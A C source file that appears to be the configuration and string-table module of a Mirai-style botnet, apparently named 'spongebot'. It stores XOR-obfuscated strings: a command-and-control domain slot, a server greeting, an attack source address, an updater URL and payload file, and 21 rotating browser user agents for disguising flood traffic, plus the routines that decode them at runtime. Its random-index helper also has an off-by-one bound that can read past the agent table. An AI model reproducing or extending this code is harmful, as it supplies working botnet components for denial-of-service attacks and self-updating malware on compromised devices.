#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>

#include <dict.h>

#define XOR_KEY 0x87f08f33U

struct dict_item dict[DICT_MAX_ITEMS];
struct dict_user_agent user_agent_dict[DICT_AGENTS_MAX];

char *xord_agents[21] = {
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC3\x99\xE9\x46\xF7\xCB\xA7\x72\xE1\x94\xF5\x5C\xE6\x94\xA7\x06\xA1\xC0\xA9\x02\xB4\xD0\xD1\x60\xB6\xC8\xB2\x13\xBB\xB7\xA7\x71\xFA\x99\xEB\x57\xA0\xBC\xD5\x6B\xBD\xC1\xDE\x1A\xAF\xB1\xF7\x43\xE3\x95\xD0\x56\xED\xBB\xEE\x47\xA0\xC5\xB4\x04\xA1\xC3\xB1\x13\xA7\xBB\xCF\x67\xC2\xBC\xAB\x13\xE3\x99\xEC\x56\xAF\xB7\xE2\x50\xE4\x9F\xAE\x13\xCC\x98\xF5\x5C\xE2\x95\xA8\x07\xBA\xDE\xB7\x1D\xBD\xC4\xB2\x07\xA1\xC8\xB3\x13\xC2\x9F\xE5\x5A\xE3\x95\xA7\x60\xEE\x96\xE6\x41\xE6\xDF\xB2\x00\xB8\xDE\xB4\x05",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x06\xA1\xC1\xBC\x13\xFD\x86\xBD\x00\xBC\xDE\xB7\x1A\xAF\xB7\xE2\x50\xE4\x9F\xA8\x01\xBF\xC1\xB7\x03\xBE\xC0\xB6\x13\xC9\x99\xF5\x56\xE9\x9F\xFF\x1C\xBC\xC3\xA9\x03",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x05\xA1\xC2\xBC\x13\xD8\x99\xE9\x05\xBB\xCB\xA7\x4B\xB9\xC4\xAE\x13\xCE\x80\xF7\x5F\xEA\xA7\xE2\x51\xC4\x99\xF3\x1C\xBA\xC3\xB0\x1D\xBC\xC6\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x70\xE7\x82\xE8\x5E\xEA\xDF\xB3\x06\xA1\xC0\xA9\x01\xBB\xC5\xB3\x1D\xB7\xC5\xA7\x60\xEE\x96\xE6\x41\xE6\xDF\xB2\x00\xB8\xDE\xB4\x05",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xE6\xA0\xEF\x5C\xE1\x95\xBC\x13\xCC\xA0\xD2\x13\xE6\xA0\xEF\x5C\xE1\x95\xA7\x7C\xDC\xD0\xBF\x6C\xBB\xD0\xEB\x5A\xE4\x95\xA7\x7E\xEE\x93\xA7\x7C\xDC\xD0\xDF\x1A\xAF\xB1\xF7\x43\xE3\x95\xD0\x56\xED\xBB\xEE\x47\xA0\xC6\xB7\x03\xA1\xC1\xA9\x07\xAF\xD8\xCC\x7B\xDB\xBD\xCB\x1F\xAF\x9C\xEE\x58\xEA\xD0\xC0\x56\xEC\x9B\xE8\x1A\xAF\xB3\xF5\x5A\xC0\xA3\xA8\x07\xBA\xDE\xB7\x1D\xBD\xC4\xB2\x07\xA1\xC6\xBF\x13\xC2\x9F\xE5\x5A\xE3\x95\xA8\x02\xBD\xB8\xB6\x07\xBC\xD0\xD4\x52\xE9\x91\xF5\x5A\xA0\xC6\xB7\x03\xA1\xC1\xA9\x07",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC2\x91\xE4\x5A\xE1\x84\xE8\x40\xE7\xCB\xA7\x7A\xE1\x84\xE2\x5F\xAF\xBD\xE6\x50\xAF\xBF\xD4\x13\xD7\xD0\xB6\x03\xD0\xC9\xD8\x06\xA6\xD0\xC6\x43\xFF\x9C\xE2\x64\xEA\x92\xCC\x5A\xFB\xDF\xB2\x00\xB8\xDE\xB4\x05\xAF\xD8\xCC\x7B\xDB\xBD\xCB\x1F\xAF\x9C\xEE\x58\xEA\xD0\xC0\x56\xEC\x9B\xE8\x1A\xAF\xB3\xEF\x41\xE0\x9D\xE2\x1C\xBB\xC2\xA9\x03\xA1\xC2\xB4\x02\xBE\xDE\xB6\x00\xBA\xD0\xD4\x52\xE9\x91\xF5\x5A\xA0\xC5\xB4\x04\xA1\xC3\xB1",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x05\xA1\xC0\xBC\x13\xD8\xBF\xD0\x05\xBB\xCB\xA7\x41\xF9\xCA\xB4\x0A\xA1\xC0\xAE\x13\xC8\x95\xE4\x58\xE0\xDF\xB5\x03\xBE\xC0\xB7\x02\xBF\xC1\xA7\x75\xE6\x82\xE2\x55\xE0\x88\xA8\x00\xB6\xDE\xB7",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC3\x99\xE9\x46\xF7\xCB\xA7\x72\xE1\x94\xF5\x5C\xE6\x94\xA7\x06\xA1\xC0\xA9\x01\xB4\xD0\xCB\x74\xA2\xA6\xB3\x02\xBF\xDF\xD1\x07\xBE\xC0\xB5\x03\xED\xD0\xC5\x46\xE6\x9C\xE3\x1C\xC3\xA2\xDF\x01\xBD\xB7\xAE\x13\xCE\x80\xF7\x5F\xEA\xA7\xE2\x51\xC4\x99\xF3\x1C\xBA\xC3\xB0\x1D\xBC\xC6\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x65\xEA\x82\xF4\x5A\xE0\x9E\xA8\x07\xA1\xC0\xA7\x70\xE7\x82\xE8\x5E\xEA\xDF\xB4\x07\xA1\xC0\xA9\x02\xB7\xC4\xB0\x1D\xBE\xC1\xBF\x13\xDC\x91\xE1\x52\xFD\x99\xA8\x06\xBC\xC7\xA9\x00\xB9",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC2\x91\xE4\x5A\xE1\x84\xE8\x40\xE7\xCB\xA7\x7A\xE1\x84\xE2\x5F\xAF\xBD\xE6\x50\xAF\xBF\xD4\x13\xD7\xD0\xB6\x03\xD0\xC1\xB7\x6C\xBA\xD9\xA7\x72\xFF\x80\xEB\x56\xD8\x95\xE5\x78\xE6\x84\xA8\x06\xBC\xC7\xA9\x00\xB9\xD0\xAF\x78\xC7\xA4\xCA\x7F\xA3\xD0\xEB\x5A\xE4\x95\xA7\x74\xEA\x93\xEC\x5C\xA6\xD0\xC4\x5B\xFD\x9F\xEA\x56\xA0\xC4\xB0\x1D\xBF\xDE\xB5\x06\xBF\xC3\xA9\x03\xAF\xA3\xE6\x55\xEE\x82\xEE\x1C\xBA\xC3\xB0\x1D\xBC\xC6",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD7\xC1\xB6\x08\xAF\xB6\xE2\x57\xE0\x82\xE6\x08\xAF\xBC\xEE\x5D\xFA\x88\xA7\x4B\xB7\xC6\xD8\x05\xBB\xCB\xA7\x41\xF9\xCA\xB4\x0B\xA1\xC0\xAE\x13\xC8\x95\xE4\x58\xE0\xDF\xB5\x03\xBE\xC0\xB7\x02\xBF\xC1\xA7\x75\xE6\x82\xE2\x55\xE0\x88\xA8\x00\xB7\xDE\xB7",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xE6\xA0\xEF\x5C\xE1\x95\xBC\x13\xCC\xA0\xD2\x13\xE6\xA0\xEF\x5C\xE1\x95\xA7\x7C\xDC\xD0\xBF\x6C\xBE\xAF\xB6\x13\xE3\x99\xEC\x56\xAF\xBD\xE6\x50\xAF\xBF\xD4\x13\xD7\xD9\xA7\x72\xFF\x80\xEB\x56\xD8\x95\xE5\x78\xE6\x84\xA8\x05\xBF\xC0\xA9\x02\xA1\xC4\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x65\xEA\x82\xF4\x5A\xE0\x9E\xA8\x0B\xA1\xC0\xA7\x7E\xE0\x92\xEE\x5F\xEA\xDF\xB6\x01\xCD\xC4\xB4\x06\xAF\xA3\xE6\x55\xEE\x82\xEE\x1C\xB9\xC0\xB7\x1D\xBE\xDE\xB3",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC2\x91\xE4\x5A\xE1\x84\xE8\x40\xE7\xCB\xA7\x7A\xE1\x84\xE2\x5F\xAF\xBD\xE6\x50\xAF\xBF\xD4\x13\xD7\xD0\xB6\x03\xD0\xC1\xB7\x6C\xBA\xD9\xA7\x72\xFF\x80\xEB\x56\xD8\x95\xE5\x78\xE6\x84\xA8\x06\xBC\xC7\xA9\x00\xB9\xD0\xAF\x78\xC7\xA4\xCA\x7F\xA3\xD0\xEB\x5A\xE4\x95\xA7\x74\xEA\x93\xEC\x5C\xA6\xD0\xC4\x5B\xFD\x9F\xEA\x56\xA0\xC4\xB4\x1D\xBF\xDE\xB5\x00\xBA\xC7\xA9\x02\xBC\xC0\xA7\x60\xEE\x96\xE6\x41\xE6\xDF\xB2\x00\xB8\xDE\xB4\x05",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD7\xC1\xB6\x08\xAF\xBC\xEE\x5D\xFA\x88\xA7\x4B\xB7\xC6\xD8\x05\xBB\xCB\xA7\x41\xF9\xCA\xB5\x0B\xA1\xC0\xAE\x13\xC8\x95\xE4\x58\xE0\xDF\xB5\x03\xBE\xC0\xB7\x02\xBF\xC1\xA7\x75\xE6\x82\xE2\x55\xE0\x88\xA8\x01\xB7\xDE\xB7",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x05\xA1\xC3\xBC\x13\xD8\x99\xE9\x05\xBB\xCB\xA7\x4B\xB9\xC4\xAE\x13\xCE\x80\xF7\x5F\xEA\xA7\xE2\x51\xC4\x99\xF3\x1C\xBA\xC3\xB0\x1D\xBC\xC6\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x70\xE7\x82\xE8\x5E\xEA\xDF\xB3\x07\xA1\xC0\xA9\x01\xBB\xC0\xB4\x1D\xBE\xC5\xB0\x13\xDC\x91\xE1\x52\xFD\x99\xA8\x06\xBC\xC7\xA9\x00\xB9",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC2\x91\xE4\x5A\xE1\x84\xE8\x40\xE7\xCB\xA7\x7A\xE1\x84\xE2\x5F\xAF\xBD\xE6\x50\xAF\xBF\xD4\x13\xD7\xD0\xB6\x03\xA1\xC9\xBC\x13\xFD\x86\xBD\x00\xB9\xDE\xB7\x1A\xAF\xB7\xE2\x50\xE4\x9F\xA8\x01\xBF\xC1\xB7\x03\xBE\xC0\xB6\x13\xC9\x99\xF5\x56\xE9\x9F\xFF\x1C\xBC\xC6\xA9\x03",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x07\xA1\xC0\xA7\x1B\xEC\x9F\xEA\x43\xEE\x84\xEE\x51\xE3\x95\xBC\x13\xC2\xA3\xCE\x76\xAF\xC8\xA9\x03\xB4\xD0\xD0\x5A\xE1\x94\xE8\x44\xFC\xD0\xC9\x67\xAF\xC6\xA9\x02\xB4\xD0\xD0\x7C\xD8\xC6\xB3\x08\xAF\xA4\xF5\x5A\xEB\x95\xE9\x47\xA0\xC4\xA9\x03\xB4\xD0\xD4\x7F\xCC\xB3\xB5\x08\xAF\xDE\xC9\x76\xDB\xD0\xC4\x7F\xDD\xD0\xB5\x1D\xBF\xDE\xB2\x03\xB8\xC2\xB0\x08\xAF\xDE\xC9\x76\xDB\xD0\xC4\x7F\xDD\xD0\xB4\x1D\xBA\xDE\xB4\x03\xB8\xC2\xBE\x08\xAF\xDE\xC9\x76\xDB\xD0\xC4\x7F\xDD\xD0\xB4\x1D\xBF\xDE\xB4\x03\xB8\xC2\xBE\x08\xAF\xB9\xE9\x55\xE0\xA0\xE6\x47\xE7\xDE\xB4\x08\xAF\xDE\xC9\x76\xDB\xC4\xA9\x03\xCC\xCB\xA7\x1D\xC1\xB5\xD3\x07\xA1\xC0\xC2\x1A",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xC2\x91\xE4\x5A\xE1\x84\xE8\x40\xE7\xCB\xA7\x7A\xE1\x84\xE2\x5F\xAF\xBD\xE6\x50\xAF\xBF\xD4\x13\xD7\xD0\xB6\x03\xD0\xC8\xD8\x01\xA6\xD0\xC6\x43\xFF\x9C\xE2\x64\xEA\x92\xCC\x5A\xFB\xDF\xB2\x00\xB8\xDE\xB4\x05\xAF\xD8\xCC\x7B\xDB\xBD\xCB\x1F\xAF\x9C\xEE\x58\xEA\xD0\xC0\x56\xEC\x9B\xE8\x1A\xAF\xB3\xEF\x41\xE0\x9D\xE2\x1C\xBB\xC5\xA9\x03\xA1\xC2\xB3\x06\xBB\xDE\xBF\x06\xAF\xA3\xE6\x55\xEE\x82\xEE\x1C\xBA\xC3\xB0\x1D\xBC\xC6",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x06\xA1\xC2\xAE\x13\xCE\x80\xF7\x5F\xEA\xA7\xE2\x51\xC4\x99\xF3\x1C\xBA\xC3\xB0\x1D\xBC\xC6\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x70\xE7\x82\xE8\x5E\xEA\xDF\xB3\x06\xA1\xC0\xA9\x01\xBB\xC5\xB3\x1D\xB7\xC5\xA7\x60\xEE\x96\xE6\x41\xE6\xDF\xB2\x00\xB8\xDE\xB4\x05",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x06\xA1\xC1\xAE\x13\xCE\x80\xF7\x5F\xEA\xA7\xE2\x51\xC4\x99\xF3\x1C\xBA\xC3\xB0\x1D\xBC\xC6\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x70\xE7\x82\xE8\x5E\xEA\xDF\xB3\x03\xA1\xC0\xA9\x01\xBD\xC1\xB3\x1D\xBE\xC1\xB2\x13\xDC\x91\xE1\x52\xFD\x99\xA8\x06\xBC\xC7\xA9\x00\xB9",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x06\xA1\xC2\xBC\x13\xD8\xBF\xD0\x05\xBB\xCB\xA7\x41\xF9\xCA\xB3\x03\xA1\xC0\xAE\x13\xC8\x95\xE4\x58\xE0\xDF\xB5\x03\xBE\xC0\xB7\x02\xBF\xC1\xA7\x75\xE6\x82\xE2\x55\xE0\x88\xA8\x07\xBF\xDE\xB7",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x05\xA1\xC3\xBC\x13\xD8\xBF\xD0\x05\xBB\xCB\xA7\x67\xFD\x99\xE3\x56\xE1\x84\xA8\x04\xA1\xC0\xBC\x13\xC2\xB4\xC3\x61\xC5\xA3\xBC\x13\xFD\x86\xBD\x02\xBE\xDE\xB7\x1A\xAF\x9C\xEE\x58\xEA\xD0\xC0\x56\xEC\x9B\xE8",
    "\x7E\xE0\x8A\xEE\x5F\xE3\x91\xA8\x06\xA1\xC0\xA7\x1B\xD8\x99\xE9\x57\xE0\x87\xF4\x13\xC1\xA4\xA7\x06\xA1\xC1\xAE\x13\xCE\x80\xF7\x5F\xEA\xA7\xE2\x51\xC4\x99\xF3\x1C\xBA\xC3\xB0\x1D\xBC\xC6\xA7\x1B\xC4\xB8\xD3\x7E\xC3\xDC\xA7\x5F\xE6\x9B\xE2\x13\xC8\x95\xE4\x58\xE0\xD9\xA7\x7E\xEE\x88\xF3\x5B\xE0\x9E\xA8\x07\xA1\xC4\xA9\x05\xA1\xC2\xB7\x03\xBF\xD0\xC4\x5B\xFD\x9F\xEA\x56\xA0\xC3\xB7\x1D\xBF\xDE\xB6\x06\xB6\xC9\xA9\x02\xBF\xC1\xA7\x60\xEE\x96\xE6\x41\xE6\xDF\xB2\x00\xB8\xDE\xB4\x05"
};

int secure_random(int min, int max)
{
    unsigned int num;
    getrandom(&num, sizeof(num), 0);
    return min + (num % (max - min + 1));
}

void dict_init(void)
{
    for (int i = 0; i < DICT_MAX_ITEMS; i++)
    {
        dict[i].value = NULL;
        dict[i].value_len = 0;
    }

    for (int i = 0; i < DICT_AGENTS_MAX; i++)
    {
        user_agent_dict[i].value = NULL;
        user_agent_dict[i].value_len = 0;
    }

    dict_add(DICT_DOMAIN_NAME, "\x02\xBD\xC7\xA9\x03\xA1\xC0\xA9\x02");                          // domain name
    dict_add(DICT_SERVER_HELLO, "\x7B\xEA\x9C\xEB\x5C\xAF\xBD\xF5\x1D\xAF\xBB\xF5\x52\xED\x83"); // example: hello server

    // TCP ESSYN
    dict_add(ATK_LOCAL_ADDR, "\x02\xB6\xC2\xA9\x02\xB9\xC8\xA9"); // default: 192.168.3.100

    // http://localhost:3000/version/get
    dict_add(UPDATER_URL, "\x5B\xFB\x84\xF7\x09\xA0\xDF\xEB\x5C\xEC\x91\xEB\x5B\xE0\x83\xF3\x09\xBC\xC0\xB7\x03\xA0\x86\xE2\x41\xFC\x99\xE8\x5D\xA0\x97\xE2\x47");
    dict_add(UPDATER_TMP_FILE, "\x40\xFF\x9F\xE9\x54\xEA\x92\xE8\x47");                                         // es: spongebot (elf)
    dict_add(UPDATER_VER_FILE, "\x50\xFA\x82\xF5\x56\xE1\x84\xD8\x45\xEA\x82\xF4\x5A\xE0\x9E\xA9\x47\xF7\x84"); // current_version.txt

    /* User Agents */
    for (int i = 0; i < 21; i++) {
        dict_agent_add(i, xord_agents[i]);
    }

}

void xor_encrypt_decrypt(char *data, size_t len, uint32_t key)
{
    uint8_t keys[4] = {
        key & 0xFF,
        (key >> 8) & 0xFF,
        (key >> 16) & 0xFF,
        (key >> 24) & 0xFF};

    for (size_t i = 0; i < len; i++)
    {
        data[i] ^= keys[i % 4];
    }
}

void dict_agent_add(int index, const char *value)
{
    if (index < 0 || index >= DICT_AGENTS_MAX)
    {
#ifdef DEBUG
        printf("[agents]: Index out of range!\n");
#endif
        return;
    }

    if (user_agent_dict[index].value != NULL)
    {
        free(user_agent_dict[index].value);
    }

    size_t value_len = strlen(value);
    user_agent_dict[index].value_len = value_len;
    user_agent_dict[index].value = (char *)malloc(value_len + 1);

    if (!user_agent_dict[index].value)
    {
#ifdef DEBUG
        printf("[agents] Error during memory allocation!\n");
#endif
        return;
    }

    memcpy(user_agent_dict[index].value, value, value_len + 1);
}

char *get_random_user_agent()
{
    int generated_agent_index = 0;

    do
    {
        generated_agent_index = secure_random(0, DICT_AGENTS_MAX);
    } while ((generated_agent_index < 0) || (generated_agent_index > DICT_AGENTS_MAX) || (user_agent_dict[generated_agent_index].value == NULL) || (user_agent_dict[generated_agent_index].value_len == 0));

    char *decrypted_value = (char *)malloc(user_agent_dict[generated_agent_index].value_len + 1);
    if (decrypted_value == NULL)
    {
#ifdef DEBUG
        printf("[agents] Error during memory allocation\n");
#endif
        return NULL;
    }

    memcpy(decrypted_value, user_agent_dict[generated_agent_index].value, user_agent_dict[generated_agent_index].value_len + 1);

    xor_encrypt_decrypt(decrypted_value, user_agent_dict[generated_agent_index].value_len, XOR_KEY);

    return decrypted_value;
}

void dict_add(int index, const char *value)
{
    if (index < 0 || index >= DICT_MAX_ITEMS)
    {
#ifdef DEBUG
        printf("[dictionary]: Index out of range!\n");
#endif
        return;
    }

    if (dict[index].value != NULL)
    {
        free(dict[index].value);
    }

    size_t value_len = strlen(value);
    dict[index].value_len = value_len;
    dict[index].value = (char *)malloc(value_len + 1);

    if (!dict[index].value)
    {
#ifdef DEBUG
        printf("[dictionary] Error during memory allocation!\n");
#endif
        return;
    }

    memcpy(dict[index].value, value, value_len + 1);
}

char *dict_get(int index)
{
    if (index < 0 || index >= DICT_MAX_ITEMS || dict[index].value == NULL)
    {
        return NULL;
    }

    char *decrypted_value = (char *)malloc(dict[index].value_len + 1);
    if (decrypted_value == NULL)
    {
#ifdef DEBUG
        printf("[dictionary] Error during memory allocation\n");
#endif
        return NULL;
    }

    memcpy(decrypted_value, dict[index].value, dict[index].value_len + 1);

    xor_encrypt_decrypt(decrypted_value, dict[index].value_len, XOR_KEY);

    return decrypted_value;
}

void dict_free(void)
{
    // clean dict
    for (int i = 0; i < DICT_MAX_ITEMS; i++)
    {
        if (dict[i].value)
        {
            free(dict[i].value);
            dict[i].value = NULL;
        }
    }

    // clean user agents dict
    for (int i = 0; i < DICT_AGENTS_MAX; i++)
    {
        if (user_agent_dict[i].value)
        {
            free(user_agent_dict[i].value);
            user_agent_dict[i].value = NULL;
        }
    }
}

void dict_init(void);
void xor_encrypt_decrypt(char *data, size_t len, uint32_t key);
void dict_add(int index, const char *value);
char *dict_get(int index);
void dict_free(void);